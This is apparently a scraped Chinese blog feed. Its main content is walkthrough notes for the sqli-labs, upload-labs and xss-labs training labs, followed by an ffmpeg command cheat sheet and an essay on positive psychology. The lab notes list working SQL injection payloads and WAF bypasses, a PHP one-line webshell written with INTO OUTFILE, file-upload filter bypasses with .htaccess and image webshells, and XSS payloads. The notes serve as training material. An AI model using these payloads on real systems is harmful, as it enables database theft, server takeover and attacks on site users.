union&#x2F;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbb&#x2F;select 构造较大数据 &#x2F;!union select&#x2F; 内敛注释 MYSQL特有 空白符绕过 MYSQL空白符：%09；%0A；%0B；%0D；%20；%0C；%A0；&#x2F;XXX&#x2F; 正则空白符：%09；%0A；%0B；%0D；%20； %25是百分号，%25A0是空白符 函数分割符号 将一个函数进行分割concat() concat%2520() concat&#x2F;**&#x2F;() concat%250c() concat%25a0() 浮点数词法解释 WAF对于id&#x3D;1可以进行检测，但是对于id&#x3D;1E0、id&#x3D;1.0、id&#x3D;\\N可能就无法检测 利用error-based进行SQL注入 extractvalue(1, concat(0x5c,md5(3))); updatexml(1, concat(0x5d,md5(3)),1); GeometryCollection(selectfrom(selectfrom(select@@version)f)x) polygon((select*from(select name const(version(),1))x)) linestring() multipoint() multilinestring() multipolygon() MYSQL特殊语法 select {x schema_name} from {x information_schema.schemata}; select {x 1}; 大小写绕过 如果对关键字and or union等进行了过滤，可以考虑使用大小写混合的方法 Or aNd UniOn 但是很多时候有函数会部分大小写进行过滤，这个时候我们可以考虑使用双写的方法 关键字重复 OORr 关键字替换 如果还是无法绕过，可以考虑替换的方法 and —— &amp;&amp; or —— || like —— &#x3D; &lt;&gt; —— !&#x3D; 方法有很多，这里依然列举可能不足 fuzz测试 可以使用burpsuite配合手工进行测试，后期测试成功后再用脚本进行处理。 1234567891011121314or被过滤，尝试双写http://localhost/sqli-labs/Less-25/?id=1&#x27; oorrder by 1--+获得回显http://localhost/sqli-labs/Less-25/?id=-1&#x27; union select 1,2,3--+所有or都需要写两次http://localhost/sqli-labs/Less-25/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,username,passwoorrd)) from security.users--+使用基于时间的布尔盲注http://localhost/sqli-labs/Less-25/?id=-1 oorr if(length(database())&gt;1,1,sleep(5))--+布尔盲注 返回正常，可知大于1http://localhost/sqli-labs/Less-25/?id=-1 oorr length(database())&gt;1--+Less25ahttp://localhost/sqli-labs/Less-25a/?id=-1 union select 1,2,3 --http://localhost/sqli-labs/Less-25a/?id=-1 oorr if(length(database())&gt;1,1,sleep(5)) Less26%09 TAB键（水平）%0a 新建一行%0c 新的一页%0d return 功能%0b TAB键（垂直）%a0 空格 12345windows下无法使用特殊字符代替空格，因为apache的解析问题，换linux就没问题http://localhost/sqli-labs/Less-26/?id=1&#x27;%a0||&#x27;1Less26ahttp://localhost/sqli-labs/Less-26a/?id=100&#x27;) union%a0select%a01,2,3||(&#x27;1 Less27123456字符过滤和大小写http://localhost/sqli-labs/Less-27/?id=100&#x27; union%a0SeLEcT%a01,database(),3||&#x27;1Less27ahttp://localhost/sqli-labs/Less-27a/?id=100 &quot;%a0Union%a0SElecT%a01,user(),&quot;3我们利用3前面的&quot;将后面的&quot;闭合掉。也可以用之前的方法 1,user(),3|| &quot;1 Less281234Less28http://localhost/sqli-labs/Less-28/?id=100&#x27;)union%a0select(1),(user()),(3)||(&#x27;1Less28ahttp://localhost/sqli-labs/Less-28a/?id=100%27)union%0bsElect%0b1,@@basedir,3||(%271 Less29服务器两层架构Background-6 服务器（两层）架构http参数污染：jsp&#x2F;tomcat使 用getgetParameter(“id”)获取到的是第一个值，php&#x2F;apache使用$_ GET[“id”]获取的是第二个值，那么第一个id纯数字，第二个id的值注入就可以了 123456说明数据有3列，且第一个id值无法注入http://localhost/sqli-labs/Less-29/?id=1&amp;id=3&#x27; order by 3--+掌握回显位置http://localhost/sqli-labs/Less-29/?id=1&amp;id=113&#x27; union select 1,2,3--+获取数据库http://localhost/sqli-labs/Less-29/?id=1&amp;id=113&#x27; union select 1,2,group_concat(schema_name) from information_schema.schemata--+ Less30‘换“ Less31换”) Less32宽字节注入宽字节: GB2312、 GBK、 GB18030、 BIG5、 Shift. JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是ASCI字符(一字节)的现象，即将两个asci字符误认为是一个宽字节字符。中文、韩文、日文等均存在宽字节，英文默认都是一个字节。在使用PHP连接MySQL的时候，当设置“set character. set. client &#x3D; gbk”时会导致个编码转换的问题。例子：id&#x3D; 1’ 处理1&#39; 进行编码1%5c%27 带入sql后id&#x3D;&#39;and XXX 此时无法完成注入id&#x3D;1%df’ 处理 1%df&#39; 进行编码1%df%5c%27 带入sql后id &#x3D;1運’ and XXX 此时存在宽字节注入漏洞 1234注入http://localhost/sqli-labs/Less-32/?id=-1%df&#x27; union select 1,2,3--+将单引号内的内容用16进制替代http://localhost/sqli-labs/Less-32/?id=-1%df&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+ 方法二%5c代表的是此时构造：%5c %5c %5c %5c’只要是我们能将返回的结果中对于单引号没有转义字符进行处理即可。 12示例http://localhost/sqli-labs/Less-32/?id=-1%aa%5c&#x27; union select 1,2,3 --+ Less33php中的addslashes()函数自定义过滤，该函数在预定义字符之前添加反斜杠的字符串 1234方法一 直接使用宽字节方法http://localhost/sqli-labs/Less-33/?id=-1%df&#x27; union select 1,2,3--+方法二 自定义闭合http://localhost/sqli-labs/Less-33/?id=-1%aa%5c%27 union select 1,2,3--+ Less34123为了测试方便，我们在代码中加入: echo Ssql;echo &quot;&lt;br&gt;&quot;; 我们首先测试在POST情况下，传入正确和错误的值回显情祝： admin:admin 正确的密码和账号&gt;返回姓名等常规信息 ad:ad；错误的密码和账号&gt;返回的是登录失败 同样通过代码可知，本关也使用了addslases()函数，理论上我们可以使用前几关中的宽字节注入的方法进行测试，但是测试的时候发现，方法并不奏效。(主 要原因是因为我们不能够直接在POST中传入数据，因为会被再次编码) 分析，在get型传 参的时候使用URLencode，所以我们可以使用以下两种方法：法一：我们借鉴了将单引号的UTF 8转换为UTF 16的单引号模式‘→目’法二：我们使用burpsuite进行抓包之后对数据进行宽字节注入 Less3512注入http://localhost/sqli-labs/Less-35/?id=1 and if( length(database())=1,1,sleep(5) )--+ Less3612注入 但不可用，不知为何http://localhost/sqli-labs/Less-36/?id=-1%df&#x27; union select 1,2,3--+ Less37我们首先测试在POST情况下，传入正确和错误的值回显情况： admin:admin 正确的密码和账号-&gt;返回姓名等常规信息 ad:ad 错误的密码和账号-&gt;返回的是登录失败 与34关基本相似，本关只是将过滤函数进行了替换: mysgL real escape string()， 同样，我们可以直接按照34关的方法即可！ 分析，在get型传参的时候使用URLencode，所以我们可以使用以下两种方法：法一：我们借鉴了将单引号的UTF -8转换为UTF-16的单引号模式’→白’法二：我们使用burpsuite进行 抓包之后对数据进行宽字节注入 Less38堆叠注入Stacked injections:堆叠注入。从名词的含义就可以看到应该是一堆sql语句(多条) -起执行。 而在真实的运用中也是这样的，我们知道在mysql中，主要是命令行中，每一条语句结尾加；表示语句结束。这样我们就想到了是不是可以多句一起使用。 这个叫 做stacked injection. 12堆叠注入 插入表http://localhost/sqli-labs/Less-38/?id=1&#x27;; create table crow2 like users; --+ Less3912无需包裹，直接注入http://localhost/sqli-labs/Less-39/?id=1; create table crow2 like users; --+ Less40’) Less41和Less39一样，无需包裹，但报错不会显示出来。 Less42123post请求要使用#注释a&#x27;;create table crow like users;#a&#x27;;drop table crow;# Less43‘) Less44和Less42一致，没有报错信息‘ Less45和Less43一致，没有报错信息‘) Less46lines terminated by xxx 以xxx为结尾 12select&#x27;&lt;?php @eval(S_ POST[crow]);?&gt;&#x27;into outfile&#x27;C:\\\\phpstudy\\\\PHPTutorial\\\\WWW\\\\crow.pbp&#x27;linesterminated by 0x363636; 0x后面一段是16进制的一句话木马![[Pasted image 20230606161120.png]] 123456测试 存在注入点http://localhost/sqli-labs/Less-46/?sort=1 and 1=1这句有错误，不知为何 错误注入http://localhost/sqli-labs/Less-46/?sort=3 and updatexml(1, concat(0x7e,(databse()) ), 1)--+时间注入http://localhost/sqli-labs/Less-46/?sort=3 and if( (length(database())&gt;1) ,1,sleep(5) )--+ Less47’ Less48与Less46一致无法使用报错注入，只能使用时间盲注 Less49与47 48类似‘只能时间盲注 Less50123456789时间注入http://localhost/sqli-labs/Less-50/?sort=1 and if( (length(database())&gt;1) ,1,sleep(5) )--+报错注入http://localhost/sqli-labs/Less-50/?sort=1 and updatexml(1, concat(0x7e,(database())),1)--+写入一句话木马（这里不演示堆叠注入创建删除表http://localhost/sqli-labs/Less-50/?sort=1;create table crow like users;--+http://localhost/sqli-labs/Less-50/?sort=1;drop table crow;--+使用堆叠方法写入一句话木马（这里不演示，方法不局限还有其他方法 Less51’ Less52没有报错回显，不可使用报错注入。 Less53‘不可报错注入 Less54id&#x3D;‘’“”()(‘’)((“”))((‘’))不加符号 12345678测试注入点 只有十次机会http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,3--+http://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;--+yjii0ojm5yhttp://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;fwzg6z6107&#x27;--+id,sessid,secret_EY7D,tryyhttp://localhost/sqli-labs/Less-54/?id=-1&#x27; union select 1,2,group_concat(concat_ws(0x7e,secret_EY7D)) from CHALLENGES.yjii0ojm5y--+X4RFISto9goPD02z36t3mEFX Less55123456714次机会 (id)http://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;--+my9zt8d12fhttp://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;my9zt8d12f&#x27;--+secret_67LDhttp://localhost/sqli-labs/Less-55/?id=-1) union select 1,2,group_concat(concat_ws(0x7e,secret_67LD)) from CHALLENGES.my9zt8d12f--+ZzyHEhfD1qHROT2lKDeYI8Le Less56(‘id’) Less57“id” Less581234567报错注入http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27;) ),1)--+yyx72wina0http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;my9zt8d12f&#x27;) ),1)--+secret_XAE8http://localhost/sqli-labs/Less-58/?id=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(secret_XAE8) from CHALLENGES.yyx72wina0) ),1)--+dihvxPDINxChzaT6O0OygRoH Less59与58类似，无包裹。id Less60(“id”) Less61((‘id’)) Less62(‘id’)只能盲注 1234判断数据库长度http://localhost/sqli-labs/Less-62/?id=1&#x27;) and if(length(databse()=1),1,sleep(5))--+判断该表第一个字母是不是比a大http://localhost/sqli-labs/Less-62/?id=1&#x27;) and if(left((select table_name from information_schema.tables where table_schema=&#x27;CHALLENGES&#x27; limit 0,1),1)&gt;&#x27;a&#x27;,1,sleep(5))--+ Less63‘id’盲注 Less64((id)) Less65(“id”)","categories":[{"name":"安全","slug":"安全","permalink":"https://yeyeyeyeto.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"upload-labs 通关笔记","slug":"security/upload-labs","date":"2024-06-15T19:54:37.000Z","updated":"2024-06-15T12:30:31.932Z","comments":true,"path":"安全/2024-06-16-security/upload-labs.html","permalink":"https://yeyeyeyeto.github.io/%E5%AE%89%E5%85%A8/2024-06-16-security/upload-labs.html","excerpt":"","text":"Pass1前端验证 方法1：F12 - F1 - Debugger - Disable JavaScript（禁用JS）方法2：使用BP抓包工具改后缀名方法3：通过修改对方html提交的action，使用自己的js文件。 Pass2文件类型验证，验证MIME信息。 进行抓包，将Content-Type修改为允许上传的类型（image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif）三选一。 Pass3黑名单验证 - 特殊后缀。分析代码，进行黑名单验证，但是黑名单不全，可以使用php3、php5、phtml等等绕过 Pass4黑名单验证 - .htaccess 上传.htaccess文件，文件内容为 1AddType application/x-httpd-php .png 之后上传png图片即可，访问这个png图片时，网站会当做是php进行解析。 Pass5黑名单验证 - 没有循环验证（同Pass9）也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。 BP抓包修改后缀名为 .php. . 此处源码没有使用strtolower转换大小写，可以使用.PHP绕过。 Pass6黑名单验证 - 没有收尾去空 上传php文件，抓包后在后缀加空格。 Pass7黑名单验证 - 没有收尾去点 上传php文件，抓包后在后缀加点 Pass8黑名单验证 - 没有去::$DATA 上传php文件，抓包后在后缀::$DATA Pass9黑名单验证 - 没有循环验证也就是说这些收尾去空，删除末尾的点，去除字符串::$DATA，转换为小写这些东西只是验证了一次。 BP抓包修改后缀名为 .php. . Pass10黑名单绕过 - 单次过滤php 更改后缀为phpphp Pass11白名单 - 上传路径可控 可以使用%00进行截断，%00截断的条件是要满足以下两点： php 版本小于 5.3.4 php的magic_quotes_gpc为OFF状态 上传zoe.php用BP抓包修改参数，把upload&#x2F;后面加上zoe.php%00（即图二），下面的filename&#x3D;”zoe.php”改为zoe.png Pass12白名单 - 和上一关差不多，区别在于变成了post。get会自行编码，post不会。 这里我们要自己对%00编码 Pass13图片码 - 图片+PHP组成图片码进行上传 CMD生成：copy 14.jpg &#x2F;b + 14.php &#x2F;a webshell.jpg 也可以直接用Notepad直接打开图片后面加一个php代码，但是需要16进制，要不然图片可能出错。 Pass14图片码 - 本文使用getimagesize检测是否为图片文件 getimagesize()：会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的 和上一关一样，生成带有php代码的图片上传。 Pass15图片码 - 使用exif_imagetype()检查是否为图片文件 exif_imagetype()：读取一个图像的第一个字节并检查其后缀名。速度比getimage快得多 和前面一致 Pass16图片码 - 二次渲染 imagecreatefromjpeg()：二次渲染是由Gif文件或 URL 创建一个新图象。成功则返回一图像标识符&#x2F;图像资源，失败则返回false，导致图片马的数据丢失，上传图片马失败。 按照原来的方法进行上传，我们可以发现还是可以上传的，但是配合包含漏洞却无法解析，这时我们把上传的图片复制下来用Notepad打开，发现我们原来写的php代码没有了，这就是二次渲染把我们里面的php代码删掉了。我们把原图和他修改过的图片进行比较，看看哪个部分没有被修改。将php代码放到没有被更改的部分，配合包含漏洞，就可以了。使用HxD Hex Editor进行比较 具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的，知道怎么解就可以了。 Pass17条件竞争 （需要搭配BP，先跳过）","categories":[{"name":"安全","slug":"安全","permalink":"https://yeyeyeyeto.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"xss-labs 通关笔记","slug":"security/xss-labs","date":"2024-06-15T19:35:01.000Z","updated":"2024-06-15T12:37:37.653Z","comments":true,"path":"安全/2024-06-16-security/xss-labs.html","permalink":"https://yeyeyeyeto.github.io/%E5%AE%89%E5%85%A8/2024-06-16-security/xss-labs.html","excerpt":"","text":"Level 112反射http://localhost/xss-labs/level1.php?name=&lt;script&gt;alert(1)&lt;/script&gt; Level 212input标签闭合&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; Level 3123456789htmlspecialchars()：把预定义的字符转换为 HTML 实体。&amp; （和号）成为 &amp;amp; &quot; （双引号）成为 &amp;quot; &#x27; （单引号）成为 &#x27; &lt; （小于）成为 &amp;lt; &gt; （大于）成为 &amp;gt;单引号不转义，输入后点击一次输入框触发&#x27;onclick=&#x27;alert(1) Level 412相比于上一关增加了对尖括号的过滤&quot;onclick=&quot;alert(1) Level 51234过滤了on和&lt;scriptjavascript:alert(1) 使用了java伪协议：就是把javascript::后面的代码当JavaScript来执行&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt; Level 6123过滤更多元素，可以混合大小写绕过&quot;&gt;&lt;a HrEf=&quot;javascript:alert(1)&quot;&gt;&quot;&gt;&lt;iframe sRc=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; Level 712强制转小写，但过滤不严谨，可以双写绕过&quot;&gt;&lt;scscriptript&gt;alert(1)&lt;/sscriptcript&gt; Level 81234567黑名单过滤严格，但可以使用HTML实体来绕过过滤javascript:alert(1)使用网站转换后得下边一串 &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41; [HTML字符实体化转换](https://www.qqxiuzi.cn/bianma/zifushiti.php) Level 912经典白名单，看源码发现必须含有http://；在上一关基础上加上 &amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;//http:// Level 10123456这一关必须看浏览器代码，输入框被hidden，我们修改为text让其可以输入?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert(&#x27;xss&#x27;)再在name为t_sort的标签内添加以下参数onmousemove=&quot;alert(1)&quot;可以利用其他标签额外闭合&quot;&quot; onmousemove=&quot;alert(1)&quot; &quot;=&quot;&quot; Level 11123使用BP Repeater中Request添加referer&quot; type=&quot;text&quot; onmousemove=&quot;alert(1)右键Request界面Request in browser - in original session Level 1212同上，但User-Agent头&quot; type=&quot;text&quot; onmousemove=&quot;alert(1) Level 1312同上，但Cookie头；要在本来的参数后面加上&quot; type=&quot;text&quot; onmousemove=&quot;alert(1) Level 14这题本来是利用转跳到的网站，在那网站去上传一个，属性里面含有xss代码的图片，以达到弹窗的效果，但由于网站挂了，无法实验。需要隐写Exif隐藏信息。EXIF：可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。可使用鼠标右键进入属性页面查看部分信息。我们右键图片选择属性，点击详细信息就可以看到exif的相关属性。我们可以在这些属性里面添加XSS代码，然后上传图片实现弹窗。大致如下图 Level 15文件包含 ng-includeng-include指令：包含的内容将作为指定元素的子节点。默认情况下，包含的文件需要包含在同一个域名下。我们包含第一关的漏洞即可 1http://127.0.0.1/xss-labs/level15.php?src=&#x27;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#x27; Level 1612345空格过滤“0D”是把光标移到同一行的顶头——回车(CR)。“0A”是把光标移到下一行——换行(LF)。使用替身，就是将%0a或者%0D当成空格使用，在HTML中这样是合法的。http://127.0.0.1/xss-labs/level16.php?keyword=&lt;img%0dsrc=1%0donerror=alert(1)&gt; Level 17123embed标签绕过&lt;embed&gt;标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。http://127.0.0.1/xss-labs/level17.php?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27; Level 18123拼接绕过同上http://127.0.0.1/xss-labs/level18.php?arg01=a&amp;arg02=aaa onmousemove=&#x27;alert(1)&#x27; Level 19123这关是flash xss，涉及到反编译，能力有限，直接上逆向后的payload有人可能会问为啥这里不能用前面两关的方法了？因为源码把上面漏洞闭合了,加了一对双引号，绕不出去了（作者故意的）arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt; Level 201arg01=id&amp;arg02=\\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)","categories":[{"name":"安全","slug":"安全","permalink":"https://yeyeyeyeto.github.io/categories/%E5%AE%89%E5%85%A8/"}],"tags":[]},{"title":"ffmpeg 常用命令","slug":"tools/ffmpeg 常用命令","date":"2024-06-15T19:15:15.000Z","updated":"2024-06-15T12:30:38.458Z","comments":true,"path":"工具/2024-06-16-tools/ffmpeg 常用命令.html","permalink":"https://yeyeyeyeto.github.io/%E5%B7%A5%E5%85%B7/2024-06-16-tools/ffmpeg%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4.html","excerpt":"","text":"视频12345678# 视频裁断：从-ss开始 截取 -t 时长ffmpeg -ss 01:04:54 -i org.mp4 -t 00:07:45 -c:v copy -c:a copy p2.mp4# MKV转MP4ffmpeg -i input.mkv -vcodec copy -acodec copy out.mp4# 提取无音视频ffmpeg -i input.mp4 -vcodec copy -an out.mp4 音频12345678910# 提取音频ffmpeg -i sample.mp4 -q:a 0 -map a sample.mp3ffmpeg -i input.mp4 -acodec copy -vn out.aac# 提取指定时段的音频ffmpeg -i sample.mp4 -ss 00:03:05 -t 00:00:45.0 -q:a 0 -map a sample.mp3# 只提取音频流而不进行重新编码；只能是aac和m4affmpeg -i sample.avi -vn -acodec copy sample.aac 合成12# 音频视频合并ffmpeg -i out.mp4 -i out.aac -vcodec copy -acodec copy new.mp4 参数 vcodec：指定视频编码器 copy只拷贝，不做编码 an：a代表音频 n代表no，无音频的意思","categories":[{"name":"工具","slug":"工具","permalink":"https://yeyeyeyeto.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[]},{"title":"积极心理学课后感悟","slug":"diary/积极心理学课后感悟","date":"2024-06-15T19:13:19.000Z","updated":"2024-06-15T11:13:29.881Z","comments":true,"path":"日记/2024-06-16-diary/积极心理学课后感悟.html","permalink":"https://yeyeyeyeto.github.io/%E6%97%A5%E8%AE%B0/2024-06-16-diary/%E7%A7%AF%E6%9E%81%E5%BF%83%E7%90%86%E5%AD%A6%E8%AF%BE%E5%90%8E%E6%84%9F%E6%82%9F.html","excerpt":"","text":"心理学作为一门科学工具，大多盛行书籍与传播旨在发现成因、研究结果形成的过程。大多时候只是在告诉你，你有这样的问题，但谈到之后便就无言了，就只是“你有这样的问题”。或许是因为大众对心理学了解程度过低，一般在了解了自身的心理成因后，意识到问题本身后也能起到解决问题的作用。但当问题变得更加复杂，光是了解和发现已经解决不了问题时，大多读者便又会对心理学心生反感，唾骂道它的无用甚至希望自己未曾了解人性的黑暗与自我的无力。而积极心理学则是聚焦于如何更好地成为自己，从而将从记忆深处挖出的淤泥一冲而净。 积极心理学隶属于人本主义心理学，区别于精神分析与认知行为，主张研究人的内心生活体验，追求人生的意义和价值，强调个人的潜能和自我实现。人本主义的发展受到哲学概念中存在主义的影响，存在主义起源于现象学。简单来说，每个人的行为与个性都来自于他的主观经验与意识，而主观世界是相对的。内在主观世界的信息与外界的客观信息是不对称的，因此没有一个人能够体验绝对的客观世界。世界在流动，人也在流动。而人本主义就是将你的注意力放到自己的主观世界进行内观和自省。人本主义强调的就是作为个人要如何书写自己的意义史，创造出自己的小宇宙。 “我们每个人最终的归宿都是死亡，人始终是孤独的。我们孤独的闯入这个世界，又孤独的离开。没有人能真正理解我。若每个人都可以创造个人意义，那谁还会理解我，我创造意义的目的难道是为了更孤独吗？那还不如不要追求这种意义感。” 存在主义的阴暗面：虚无主义。既然世界存在都毫无意义，那我的存在也不需要有任何意义。虚无主义的想法反映的正是人类的存在焦虑，我们非常担心自己的存在是毫无意义的，也可以称意义焦虑。人类的存在充满矛盾性，一方面我们希望被世界理解，另一方面我们又害怕被世界吞噬；一方面我们希望世界能给到我们指引与答案，但另一方面我们又害怕失去个人的自由与创造力。所以我们对死感到焦虑，对生也感到焦虑。虚无主义者们试图消解这种人性的矛盾感，也就是与其焦虑意义，不如不要追求意义，以为这样就能达到自洽。于是为了减少自由的眩晕带来的焦虑感，选择和大家一样的人，妥协于集体无意识，实现世俗的成功，压抑创造力、埋葬个人意义。 事实上，人类应对意义焦虑的一种方式就是面对死亡。比如很多癌症患者、经历亲人去世或受到人生重创的人会突然心理性重生，勇敢做自己追求人生意义。认清出生就是死亡的开始，存在的本质就是向死而生，才会从充满焦虑的畏转向为勇敢的大无畏。生与死是分不开的，你选择看待死亡的方式，影响着你认为的生命真正价值。如果你认为生命本质总是美好的，那么你就是高度重视生命的神圣，无论生命内容如何，人本身是什么样并不重要，仅仅是活着的事实就足够美好了。如果你认为生命的质量才是更重要的东西，你就会想要区分充满美好经历的生命和痛苦不堪的生命。你并不认为，仅仅是活着就有价值。如此看来，有些死亡实际上可能是积极有价值的。比如死亡能给痛苦万分的存在带来解脱。东方文化下，死亡是大家都在避讳、甚至从潜意识里都在排斥和害怕的话题。而当受到巨大挫折时，又会拿着死亡当做是解决一切问题的答案，或是情绪失语时的玩笑。死亡实际上离我们很近，生与死的不可分割性，让死亡悄悄躲藏在每一刻生命鲜活舞动的背后。因苦痛经历引发的情绪挤压出来的求死心常常是人在青年时期第一次真实窥见死亡的机会。死亡并非负面，不必抗拒它。起码它在这时会要求着你必须给一个答案，而这份答案可以是你开启新生活的意义。 “对于死亡的窥探会使生命的种种意义消散，但对死亡虚无的反抗本能，又会反过来使生命的意义倔强生长起来。” 人本主义也提供了我们了解自身意义的方法。例如盛行的马斯洛需求金字塔模型，但实际上该金字塔模型是上世纪一位经理顾问用于市场营销而绘制的。后人将他的需求理论误用，更糟糕的是上下层需求大小差距区别，让人误以为经济基础决定上层建筑。但实际上马斯洛需求理论相比于金字塔模型更像是一个圆，因为人本主义强调的始终是主观经验，他的八种需求更像是一种动态关系，而非上下关系。他的目的是鼓励你去了解自己的八个需求并让自己的人格更加完整，而不是去达成一个个次需求以达到人生的顶端。比如一个有艺术抱负的年轻人愿意牺牲一些生活需求去满足精神需求。人是具有弹性的，换句话说，即便你的物质需求遇到了困难，也不意味着你无法体验到精神需求。所以人本主义提供追求意义的方式不是金字塔式的实现一个个小目标，他强调人生是体验的而非目的。我们在寻找意义和自我价值的同时也要提醒自己不要过分的追求结果，将所有事情都目的化更容易陷入长期的意义焦虑。为了抵抗失去意义的焦虑感，一些人会选择重新认识自己，还有另外一些人会为了维持现状及维持这个主观世界的存在或倒退回虚无主义者或发展成自恋型人格障碍 —— 强迫他人进入自己的主观世界，维持虚假的意义感。 消除焦虑的方式不是进入内卷，因为你再卷，也卷不过高速发展的人工智能，进入内卷的齿轮，只会让自己陷入更严重的意义焦虑。我们无法控制外部世界的变化，但我们能调整自己的内部世界，通过寻找意义感，将外部世界的生存焦虑转化为了解自己的动力，以人本主义的方式了解自己，也许很漫长，并且你不会找到答案，因为它重在体验而非结果。我们很多人在探索自己的过程中，总喜欢给自己设限，比如5年后我要实现什么，因为目标和计划能带给我们安全感，但是请你仔细想想，这些目标真的源于你的内心深处吗，还是说出于一种不安全感。人本主义会告诉你，一个真正了解自己的人一定是不断在变化的，因为他一直在学习和不断的体验自己，未来会如何我们谁也不知道，但是你一旦学会了勇敢，那些未知与变化将会成为惊喜，而非恐惧。 积极心理学相较于精神分析与认知行为里的诸多概念缺失了冲击性的爆点，但这并非它的缺点，反而是重点。Tal在第一课与最后一课里都提到：不希望听到“感谢您教我”，而是“感谢您提醒我注意一些我本知道的事情”。也许恰巧是因为这一点，这门课在某个方面来说要比其他两种流派更难以在人们口中流传起来。虽然口中似乎都在说着同样的事情与概念，但是只有本人才会明白这样话语在自己生活里渗透的深度。这门课相当简单，如果你只是回答一些问题，完成一些填空题，那么你只需要边吃早餐时边听完一遍就足够了。但这门课真正的考试应该是在生活里，是你在活着的每一个当下。以下简要表述课内重点内容，筛选与表达都带有强烈个人主观色彩。 问题创造现实。参考实验“看不见的大猩猩”，我们在提出问题后，我们只会留意那些可以解决问题的元素，聚焦关注的部分创造着我们所看见的现实，从而忽视存在的“大猩猩”。我们必须主动训练去问积极的问题，否则那部分就不存在于现实当中。管理决策上最常见的错误，就是强调去寻找到正确的答案而不是去发现如何提出正确的问题。我们知道情绪是对现象进行解读后的产物，对信息的解读与理解更大程度上决定了我们的情绪。但作用于主观的臆想也会有它的临界点，不能说我们只要有负面的情绪，就表示我们的解读出现了偏差。认知疗法是让现实与解读都处于一种平衡态，对信息的理解与现实的情况大概一致。极端的环境和真正存在的问题势必会带来情绪，但合理的解读方式会替我们拨开发现真正问题路上那些缠绕着影响我们前进的杂草。心理学界常言：人们看待世界的方式比客观的因素更能影响幸福感，时常会为了更好的幸福而选择转移注意力的方式。虽然苦苦思索是问题症结之一，但也不可用逃避的方式来达成幸福的最终结局，真正的问题是无法逃避的，但你确实可以在路上多加休息。 面对完美主义是重要的人生课题。完美主义的根源可能来自社会的影响，我们在最终的结束才能得到奖励，从而内化了我们的认知基模，结果要比过程重要。完美主义的本质也是对美好事物的向往，但不加控制的过度追求会引发生活的混乱，而在某些场合里，你会看见几乎人人都偏执地过度追求极度的完美。他们不允许休整和偏移，无法享受持续性的成长。他们将结果的重要性无限放大，非是既否。极容易具有失能性恐惧 —— 面对有可能出现的失败裹足不前的畏惧，而这也是拖延症中占比可能较大因素之一。当我们的期望是完美的时候，我们就在为自己的失败做着准备。完美主义是追求结果的，但从最终目标的结束来说，完美主义又是造成失败的最大原因。当失败的评价出现，往往有两种归因模式：一是认为天赋、思维模式、学习能力不行，归因为先天性的不可改变的因素；二是认为经验、知识和技能的不足，归因为后天、外部可以后天改变的因素。以完成最终目标来说，你应该无论他人给你何种失败的反馈，一律使用后者防御性归因，认为只是经验与知识的不足。这两种模式非常笼统，一定要从逻辑、理性角度来看，它们都存在着归因谬误。但人能确切的归因，这件事情是一个理性思维误导我们去相信的神话。我们无法确切的归因，成长型归因也是一种归因谬误，一种良性的归因谬误。 “在我生命的结尾，我会写出我的巨著。在那之前，一切都只是草稿。” 